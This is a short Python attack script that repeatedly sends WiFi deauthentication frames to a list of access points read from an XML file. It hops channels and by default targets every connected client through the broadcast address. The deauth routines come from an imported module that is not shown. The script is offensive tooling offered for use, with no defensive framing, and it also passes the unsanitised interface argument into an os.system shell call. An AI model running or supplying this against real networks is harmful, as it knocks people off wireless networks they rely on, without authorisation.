#!/usr/bin/env python
from monitormode import *
from deauth import *

channels = []

def channel_exist(channel):
    for i in range(len(channels)):
        if channel == channels[i] :
            return 1
    return 0

def channel_hopper(channel, interface):
    print("[Interface]: %s switching to channel %d" %(interface, int(channel)))
    os.system("iw dev %s set channel %d" %(interface, int(channel)))

def multi_deauth(fileName,iface,client):
    apsList = ET.parse(fileName)
    aps = apsList.getroot()
    count = 1

    while True:
        for ap in aps.findall('AccessPoint'):
            c = str(ap.get('Channel'))
            if not channel_exist(c):
                channels.append(c)
        for j in range(0,len(channels)):
            channel_hopper(channels[j],iface)
            for ap in aps.findall('AccessPoint'):
                if str(ap.get('Channel')) == channels[j]:
                    bssid = str(ap.findtext('BSSID'))
                    ssid = str(ap.findtext('SSID'))
                    print('[Deauthenticating]: %s' %(ssid))
                    deauth(iface, bssid, client, count)


 
if __name__ == "__main__":
    try:    
        if (len(sys.argv) != 3) and (len(sys.argv) !=4):
            print('[Usage]: %s target_list interface client_mac' % sys.argv[0])
            print('[Usage]: empty client_mac default to broadcast mode')
            sys.exit(1)
        elif (len(sys.argv) == 3):
            aps_list = sys.argv[1]
            interface = sys.argv[2]
            client = 'FF:FF:FF:FF:FF:FF'
        elif (len(sys.argv) == 4):
            aps_list = sys.argv[1]
            interface = sys.argv[2]
            client = sys.argv[3]
        multi_deauth(aps_list,interface,client)
    except KeyboardInterrupt:
        print('Stop deauth.')
        sys.exit(0)